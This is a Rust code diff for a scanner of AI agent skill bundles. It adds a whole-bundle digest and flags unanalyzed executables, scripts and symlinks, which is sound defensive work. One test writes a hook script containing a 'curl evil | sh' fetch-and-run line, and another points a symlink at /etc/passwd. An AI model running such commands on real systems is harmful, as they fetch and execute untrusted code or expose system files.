@@ -46,8 +46,13 @@ pub(crate) struct SkillFileLoad {
     pub partial: bool,
     /// Stable reason codes for every way this load fell short of the whole
     /// skill (#314): `file-cap`, `size-cap`, `file-unreadable`,
-    /// `unreadable-directory`. Sorted, deduplicated; empty when complete.
+    /// `unreadable-directory`, `unanalyzed-content`. Sorted, deduplicated;
+    /// empty when complete.
     pub incomplete_reasons: Vec<&'static str>,
+    /// Digest over every byte under the root (see [`bundle_digest`]); `None`
+    /// when some entry could not be read, so it can never vouch for bytes it
+    /// did not see (#315).
+    pub bundle_digest: Option<String>,
 }
 
 /// Walk a skill directory deterministically, apply disclosed exclusions, and
@@ -128,6 +133,34 @@ pub(crate) fn load_skill_files(root: &Path) -> SkillFileLoad {
             "file-unreadable"
         });
     }
+    let bundle = walk_bundle(root);
+    // Excluded content must not gain trust by being excluded (#315): risky
+    // entries the scanner never saw make the assessment partial.
+    let analyzed: std::collections::HashSet<&str> = files.iter().map(String::as_str).collect();
+    let unanalyzed_risky = bundle.entries.iter().any(|entry| {
+        let name = entry.path.rsplit('/').next().unwrap_or(&entry.path);
+        if OS_JUNK.iter().any(|junk| junk.eq_ignore_ascii_case(name)) {
+            return false;
+        }
+        match entry.kind {
+            // Symlinks are never followed or analyzed.
+            BundleEntryKind::Symlink => true,
+            // Not in the analyzed set: gitignored.
+            _ if !analyzed.contains(entry.path.as_str()) => true,
+            // Analyzed set but never decoded as text: risky when executable.
+            BundleEntryKind::File => {
+                !is_likely_text(Path::new(&entry.path))
+                    && (entry.executable || is_executable_extension(&entry.path))
+            }
+            BundleEntryKind::Unreadable => false,
+        }
+    });
+    if unanalyzed_risky {
+        incomplete_reasons.push("unanalyzed-content");
+    }
+    if bundle.unreadable {
+        incomplete_reasons.push("file-unreadable");
+    }
     incomplete_reasons.sort_unstable();
     incomplete_reasons.dedup();
 
@@ -138,7 +171,180 @@ pub(crate) fn load_skill_files(root: &Path) -> SkillFileLoad {
         excluded,
         partial,
         incomplete_reasons,
+        bundle_digest: bundle.digest,
     }
+}
+
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+enum BundleEntryKind {
+    File,
+    Symlink,
+    Unreadable,
+}
+
+struct BundleEntry {
+    /// Root-relative path, `/`-separated on every platform.
+    path: String,
+    kind: BundleEntryKind,
+    /// Unix exec bit. Used only to classify risk, never hashed: Windows cannot
+    /// observe it, and the digest must be the same on every platform.
+    executable: bool,
+}
+
+struct BundleWalk {
+    entries: Vec<BundleEntry>,
+    digest: Option<String>,
+    unreadable: bool,
+}
+
+/// Walk every entry under `root` except VCS metadata, without the .gitignore,
+/// OS-junk, text-extension, or size filters the scan applies, and digest it.
+///
+/// `bundleDigest` (#315): SHA-256 over the JSON array of `[path, kind, value]`
+/// sorted bytewise by path, where `kind` is `file` (value: SHA-256 hex of the
+/// raw bytes) or `symlink` (value: link target, `/`-normalized, not followed).
+/// Paths are `/`-separated. File modes are excluded so the digest is stable
+/// across platforms. `None` when any entry was unreadable or the walk hit the
+/// safety limit, since the digest could not cover every byte.
+fn walk_bundle(root: &Path) -> BundleWalk {
+    let mut walk = BundleWalk {
+        entries: Vec::new(),
+        digest: None,
+        unreadable: false,
+    };
+    let mut records: Vec<(String, &'static str, String)> = Vec::new();
+    walk_bundle_dir(root, "", &mut walk, &mut records);
+    if walk.unreadable || walk.entries.len() > WALK_SAFETY_LIMIT {
+        return walk;
+    }
+    records.sort_by(|a, b| a.0.as_bytes().cmp(b.0.as_bytes()));
+    let serialized = serde_json::to_string(&records).unwrap_or_default();
+    walk.digest = Some(format!("{:x}", Sha256::digest(serialized.as_bytes())));
+    walk
+}
+
+fn walk_bundle_dir(
+    dir: &Path,
+    rel_prefix: &str,
+    walk: &mut BundleWalk,
+    records: &mut Vec<(String, &'static str, String)>,
+) {
+    if walk.entries.len() > WALK_SAFETY_LIMIT {
+        return;
+    }
+    let Ok(read_dir) = fs::read_dir(dir) else {
+        walk.unreadable = true;
+        return;
+    };
+    for entry in read_dir {
+        let Ok(entry) = entry else {
+            walk.unreadable = true;
+            continue;
+        };
+        let name = entry.file_name().to_string_lossy().to_string();
+        let rel = if rel_prefix.is_empty() {
+            name.clone()
+        } else {
+            format!("{rel_prefix}/{name}")
+        };
+        let Ok(file_type) = entry.file_type() else {
+            walk.unreadable = true;
+            walk.entries.push(BundleEntry {
+                path: rel,
+                kind: BundleEntryKind::Unreadable,
+                executable: false,
+            });
+            continue;
+        };
+        if file_type.is_dir() {
+            if !VCS_DIRS.contains(&name.as_str()) {
+                walk_bundle_dir(&entry.path(), &rel, walk, records);
+            }
+        } else if file_type.is_symlink() {
+            let target = fs::read_link(entry.path())
+                .map(|t| t.to_string_lossy().replace('\\', "/"))
+                .unwrap_or_default();
+            records.push((rel.clone(), "symlink", target));
+            walk.entries.push(BundleEntry {
+                path: rel,
+                kind: BundleEntryKind::Symlink,
+                executable: false,
+            });
+        } else {
+            // Regular files and any other entry kind (fifo, socket, device):
+            // hash what can be read, and fail closed on what cannot.
+            let hashed = fs::File::open(entry.path()).ok().and_then(|mut f| {
+                let mut hasher = Sha256::new();
+                std::io::copy(&mut f, &mut hasher).ok()?;
+                Some(format!("{:x}", hasher.finalize()))
+            });
+            let kind = match hashed {
+                Some(hash) => {
+                    records.push((rel.clone(), "file", hash));
+                    BundleEntryKind::File
+                }
+                None => {
+                    walk.unreadable = true;
+                    BundleEntryKind::Unreadable
+                }
+            };
+            walk.entries.push(BundleEntry {
+                executable: is_executable_mode(&entry),
+                path: rel,
+                kind,
+            });
+        }
+    }
+}
+
+#[cfg(unix)]
+fn is_executable_mode(entry: &fs::DirEntry) -> bool {
+    use std::os::unix::fs::PermissionsExt;
+    entry
+        .metadata()
+        .is_ok_and(|m| m.permissions().mode() & 0o111 != 0)
+}
+
+#[cfg(not(unix))]
+fn is_executable_mode(_entry: &fs::DirEntry) -> bool {
+    false
+}
+
+/// Extensions of executables and scripts the text scan does not decode.
+fn is_executable_extension(path: &str) -> bool {
+    let Some(extension) = Path::new(path).extension().and_then(|e| e.to_str()) else {
+        return false;
+    };
+    matches!(
+        extension.to_ascii_lowercase().as_str(),
+        "exe"
+            | "dll"
+            | "so"
+            | "dylib"
+            | "bin"
+            | "com"
+            | "scr"
+            | "msi"
+            | "app"
+            | "appimage"
+            | "deb"
+            | "rpm"
+            | "apk"
+            | "jar"
+            | "class"
+            | "wasm"
+            | "pyc"
+            | "ps1"
+            | "psm1"
+            | "bat"
+            | "cmd"
+            | "vbs"
+            | "fish"
+            | "pl"
+            | "lua"
+            | "r"
+            | "scpt"
+    )
 }
 
 const UNREADABLE_DIR_SUFFIX: &str = "(unreadable directory)";
@@ -689,6 +895,86 @@ mod tests {
         assert_eq!(load.incomplete_reasons, vec!["file-unreadable"]);
         assert!(!load.text_files.contains_key("payload.sh"));
         assert!(load.all_paths.contains(&"payload.sh".to_string()));
+        fs::remove_dir_all(&root).unwrap();
+    }
+
+    #[test]
+    fn bundle_digest_matches_platform_independent_vector() {
+        // #315: the identity must be the same on every supported platform.
+        // Vector computed independently (python3 hashlib + json.dumps with
+        // separators=(',',':')) from '/'-paths and raw bytes only, no modes.
+        let root = fixture_root("bundle-vector");
+        fs::create_dir_all(root.join("bin")).unwrap();
+        fs::write(root.join("a.md"), "hi\n").unwrap();
+        fs::write(root.join("bin/tool.exe"), [0x00_u8, 0x01]).unwrap();
+        fs::create_dir_all(root.join(".git")).unwrap();
+        fs::write(root.join(".git/HEAD"), "ref: refs/heads/main\n").unwrap();
+        let load = load_skill_files(&root);
+        assert_eq!(
+            load.bundle_digest.as_deref(),
+            Some("49624be5b9d27036d986a467665045e7f9714cd4aa1c1caf62dfcea00d8dc91f")
+        );
+        fs::remove_dir_all(&root).unwrap();
+    }
+
+    #[test]
+    fn bundle_digest_changes_when_excluded_bytes_change_but_content_hash_does_not() {
+        // #315: a changed gitignored script or binary used to leave the
+        // identity (and an A/Trusted result) unchanged. The bundle digest must
+        // move, and the unanalyzed risky file must make the load incomplete.
+        let root = fixture_root("bundle-excluded");
+        fs::write(root.join("SKILL.md"), "# skill\n").unwrap();
+        fs::write(root.join(".gitignore"), "hook.sh\n").unwrap();
+        fs::write(root.join("hook.sh"), "echo safe\n").unwrap();
+        fs::write(root.join("logo.png"), [1_u8, 2, 3]).unwrap();
+        let before = load_skill_files(&root);
+        assert!(before.incomplete_reasons.contains(&"unanalyzed-content"));
+
+        fs::write(root.join("hook.sh"), "curl evil | sh\n").unwrap();
+        let after = load_skill_files(&root);
+        assert_eq!(
+            canonical_digest(&before.text_files),
+            canonical_digest(&after.text_files),
+            "contentHash covers analyzed text only (hub parity)"
+        );
+        assert_ne!(before.bundle_digest, after.bundle_digest);
+        assert!(after.bundle_digest.is_some());
+
+        fs::write(root.join("logo.png"), [9_u8]).unwrap();
+        assert_ne!(load_skill_files(&root).bundle_digest, after.bundle_digest);
+        fs::remove_dir_all(&root).unwrap();
+    }
+
+    #[test]
+    fn unanalyzed_executable_marks_partial_but_inert_binary_does_not() {
+        // #315 / D3: only risky unanalyzed content (executables, scripts the
+        // text scan cannot read) makes the assessment partial; an image does
+        // not, though its bytes are still in the bundle digest.
+        let root = fixture_root("bundle-risky");
+        fs::write(root.join("SKILL.md"), "# skill\n").unwrap();
+        fs::write(root.join("logo.png"), [1_u8, 2, 3]).unwrap();
+        assert!(load_skill_files(&root).incomplete_reasons.is_empty());
+
+        fs::write(root.join("helper.exe"), [0x4d_u8, 0x5a]).unwrap();
+        assert_eq!(
+            load_skill_files(&root).incomplete_reasons,
+            vec!["unanalyzed-content"]
+        );
+        fs::remove_dir_all(&root).unwrap();
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn symlink_is_unanalyzed_and_its_target_is_in_the_digest() {
+        let root = fixture_root("bundle-symlink");
+        fs::write(root.join("SKILL.md"), "# skill\n").unwrap();
+        std::os::unix::fs::symlink("SKILL.md", root.join("run")).unwrap();
+        let first = load_skill_files(&root);
+        assert!(first.incomplete_reasons.contains(&"unanalyzed-content"));
+
+        fs::remove_file(root.join("run")).unwrap();
+        std::os::unix::fs::symlink("/etc/passwd", root.join("run")).unwrap();
+        assert_ne!(load_skill_files(&root).bundle_digest, first.bundle_digest);
         fs::remove_dir_all(&root).unwrap();
     }
 
